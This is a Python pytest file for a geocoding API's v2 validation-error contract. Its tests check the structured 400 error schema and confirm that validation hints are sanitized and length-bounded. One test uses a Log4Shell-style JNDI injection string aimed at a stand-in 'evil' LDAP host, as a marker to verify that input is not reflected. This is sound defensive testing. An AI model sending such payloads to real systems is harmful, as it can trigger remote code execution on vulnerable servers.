"""T-219 M4 / ADR-061: v2 public-address validation-error contract.

The global RequestValidationError handler keeps the structured 400 envelope for every
non-vworld path (intended T-173 input-safety). These tests pin the published-contract
alignment for the v2 public address paths and the sanitized `hint` (no raw-repr leak).
"""

from __future__ import annotations

import pytest

from kortravelgeo.api.app import create_app
from kortravelgeo.api.deps import get_client
from kortravelgeo.client import AsyncAddressClient

_V2_PUBLIC_PATHS = ("/v2/geocode", "/v2/reverse", "/v2/search")


def _app_with_dummy_client() -> object:
    app = create_app()
    # validation fails before the client is touched, so a dummy engine is enough.
    app.dependency_overrides[get_client] = lambda: AsyncAddressClient(
        engine=object()  # type: ignore[arg-type]
    )
    return app


def test_v2_public_paths_advertise_structured_400_and_drop_422() -> None:
    schema = create_app().openapi()
    for path in _V2_PUBLIC_PATHS:
        responses = schema["paths"][path]["post"]["responses"]
        assert "422" not in responses, f"{path} should not advertise the auto-422"
        ref = responses["400"]["content"]["application/json"]["schema"]["$ref"]
        assert ref.endswith("/StructuredErrorEnvelope")


def test_structured_error_schema_uses_wire_keys() -> None:
    schema = create_app().openapi()
    body = schema["components"]["schemas"]["StructuredErrorBody"]
    # error_payload() always emits status="ERROR", so the published schema requires it too
    # (PR #316 review): a required const, not an optional defaulted field.
    assert {"status", "errorCode", "errorMessage"} <= set(body["required"])
    assert {"status", "errorCode", "errorMessage", "hint"} == set(body["properties"])


def test_v2_non_address_path_keeps_default_422() -> None:
    # ADR-061 §5: only the three public address paths are aligned in this PR; the rest
    # keep their pre-existing documented 422 (runtime still returns the structured 400).
    schema = create_app().openapi()
    responses = schema["paths"]["/v2/regions/within-radius"]["post"]["responses"]
    assert "422" in responses
    assert "400" not in responses


@pytest.mark.asyncio
async def test_v2_validation_hint_is_sanitized_and_does_not_leak_input() -> None:
    import httpx

    app = _app_with_dummy_client()
    secret = "x" * 250  # over the 200-char limit -> a validation error
    transport = httpx.ASGITransport(app=app)  # type: ignore[arg-type]
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.post("/v2/geocode", json={"query": secret})

    assert response.status_code == 400
    payload = response.json()["response"]
    assert payload["status"] == "ERROR"
    assert payload["errorCode"] == "E0100"
    hint = payload["hint"]
    # sanitized "loc: msg" form, not the raw pydantic errors repr.
    assert hint
    assert "query" in hint
    assert secret not in hint  # the user-supplied value must not be echoed back
    for leak in ("'input'", "'url'", "'ctx'", "'type'", "[{"):
        assert leak not in hint, f"hint leaks raw pydantic repr fragment {leak!r}: {hint!r}"


@pytest.mark.asyncio
async def test_v2_extra_key_name_is_not_reflected_in_hint() -> None:
    # extra='forbid' makes the bad-key name the loc leaf; it must not be echoed (ADR-061 §3).
    import httpx

    app = _app_with_dummy_client()
    marker = "leaked__${jndi:ldap://evil}__key"
    transport = httpx.ASGITransport(app=app)  # type: ignore[arg-type]
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.post("/v2/geocode", json={"query": "x", marker: 1})

    assert response.status_code == 400
    hint = response.json()["response"]["hint"]
    assert hint and marker not in hint
    assert "unexpected field" in hint  # still informative without reflecting the key


@pytest.mark.asyncio
async def test_v2_validation_hint_is_length_bounded() -> None:
    # a request stuffed with bogus keys must not amplify the response.
    import httpx

    app = _app_with_dummy_client()
    body: dict[str, object] = {"query": "x"}
    body.update({f"junk_{i}_{'z' * 200}": 1 for i in range(500)})
    transport = httpx.ASGITransport(app=app)  # type: ignore[arg-type]
    async with httpx.AsyncClient(transport=transport, base_url="http://test") as client:
        response = await client.post("/v2/geocode", json=body)

    assert response.status_code == 400
    hint = response.json()["response"]["hint"]
    assert hint is not None and len(hint) <= 600
